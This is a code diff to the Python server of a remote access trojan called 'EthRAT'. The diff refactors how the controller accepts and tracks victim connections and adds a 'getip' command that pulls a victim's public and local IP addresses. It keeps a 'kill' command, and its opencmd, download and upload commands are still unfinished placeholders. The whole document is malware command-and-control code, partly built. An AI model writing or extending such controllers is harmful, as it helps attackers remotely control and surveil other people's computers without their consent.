@@ -5,6 +5,7 @@ import ctypes
 import queue
 from datetime import datetime
 import struct
+import json
 
 # Colors
 cyan = "\033[1;36m"
@@ -58,54 +59,64 @@ def help():
     """ + reset)
 
 def window_title(clients):
-        if os.name == "nt":
-                ctypes.windll.kernel32.SetConsoleTitleW(f"EthRAT | CONNECTED CLIENTS: {len(clients)}")
+    """ Updates console title with connected clients count (works only on windows) """
+    if os.name == "nt":
+        ctypes.windll.kernel32.SetConsoleTitleW(f"EthRAT | CONNECTED CLIENTS: {len(clients)}")
+
 
 def list_clients(clients):
-    for index, (addr, socket) in enumerate(clients.items()):
-        print(f"{purple}{index + 1}{reset}. {green}{addr[0]}:{addr[1]}{reset}")
+    """ Returns the list of the connected clients """
+    if clients:
+        for index, (addr, _) in enumerate(clients.items()):
+            print(f"{purple}{index + 1}{reset}. {green}{addr[0]}:{addr[1]}{reset}")
+    else:
+        print(f"{red}[!] No clients connected.{reset}")
 
 def get_client_by_index(clients, choice):
-    client_list = list(clients.items()) 
+    """ Get the client socket based on user choise """
+    client_list = list(clients.items())
     if 1 <= choice <= len(client_list):
-        addr, client_socket = client_list[choice - 1]  
-        return addr, client_socket  
+        return client_list[choice - 1]
     else:
-        print(f"{red}Invalid choice. Type 'list' for the connected clients{reset}")
+        print(f"{red}Invalid choice. Type 'list' for connected clients.{reset}")
         return None, None
 
 
 
 def handle_client(socket):
-        while server_active:
-            try:
-                client_socket, addr = socket.accept()
-                clients[addr] = client_socket
-                print(f"\n{green}[+]{reset} Client connected: {addr[0]}:{addr[1]}\n\n{cyan}Main>{reset} ", end="", flush=True)
-                window_title(clients)
-                
-
-                threading.Thread(target=handle_client_commands, args=(client_socket, addr), daemon=True).start()
-
-            except (ConnectionResetError, OSError) as e:
-                 print(f"{red}[-]{reset} Client error: {e}")
-                 if addr in clients:
-                    del clients[addr]
-                    window_title(clients)
-
-def handle_client_commands(client_socket, addr):
-    try:
-        while server_active:
-            command = client_socket.recv(1024).decode()
-            if not command:
-                 break
-    except (ConnectionResetError, ConnectionAbortedError):
-        print(f"\n{red}[-]{reset} Client {addr[0]} disconnected")
-        client_socket.close()
-        if addr in clients:
-            del clients[addr]
+    """Handle incoming client connections"""
+    while server_active:
+        try:
+            client_socket, addr = socket.accept()
+            clients[addr] = client_socket
+            print(f"\n{green}[+]{reset} Client connected: {addr[0]}:{addr[1]}\n\n{cyan}Main>{reset} ", end="", flush=True)
             window_title(clients)
+            
+            threading.Thread(target=monitor_client, args=(client_socket, addr), daemon=True).start()
+            
+        except (ConnectionResetError, OSError, socket.error, Exception) as e:
+            print(f"\n{red}[-]{reset} Error accepting connection: {e}")
+            continue
 
+def monitor_client(client_socket, addr):
+    """Monitor client disconnection"""
+    try:
+        while True:
+            data = client_socket.recv(1, socket.MSG_PEEK)
+            if not data: 
+                raise ConnectionError("Client disconnected")
+                
+    except (ConnectionResetError, ConnectionAbortedError, ConnectionError, OSError) as e:
+        print(f"{red}[-]{reset} Client {addr[0]}:{addr[1]} disconnected")
+        client_socket.close()
+        clients.pop(addr, None)
+        window_title(clients)
+    except Exception as e:
+        print(f"\n{red}[-]{reset} Error with client {addr[0]}:{addr[1]}: {e}")
+        client_socket.close()
+        clients.pop(addr, None)
+        window_title(clients)
+           
 def send(sock, data):
     """ Bulk Send Commands And Data """
     try:
@@ -150,23 +161,34 @@ def send_file():
     pass
 
 def command_handler(cl_addr, cl_socket):
+    """ User-interactive command handler for a specific client """
+    ip, port = cl_addr
+    print(f"{yellow}[*]{reset} Interracting with {ip}:{port} ")
+
     while True:
         try:
             ip, port = cl_addr
             cmd = input(f"\n{cyan}[$]{reset} {blue}{ip}:{port}>{reset} ").lower().strip()
             if cmd == "kill":
-               cl_socket.send(cmd.encode()) 
-               cl_socket.close()
-               return
-            elif cmd == "opencmd":
                 cl_socket.send(cmd.encode())
-                response = "response"
+                cl_socket.close()
+                clients.pop(cl_addr, None)
+                return
+               
+            elif cmd == "opencmd":
+                print("cmd logic")
             elif cmd == "download":
                 print("download logic")
             elif cmd == "upload":
                 print("upload logic")
             elif cmd == "getip":
-                print("getip logic")
+                cl_socket.send(cmd.encode())
+                while True:
+                    res = cl_socket.recv(1024).decode()
+                    if res:
+                        res = json.loads(res)
+                        print(f"{purple}[>] Client Public IP:{reset} {res['pip']}\n{purple}[>] Client Local IP:{reset} {res['lip']}")
+                        break
             elif cmd == "back":
                 return
             else:
@@ -202,8 +224,6 @@ def start_server(lhost, lport):
                 elif cmd.isdigit():
                     addr, client_socket = get_client_by_index(clients, int(cmd))
                     if client_socket:
-                        ip, port = addr
-                        print(f"{yellow}[*]{reset} Interracting with {ip}:{port} ")
                         command_handler(addr, client_socket)
                   
                 elif cmd == "exit":
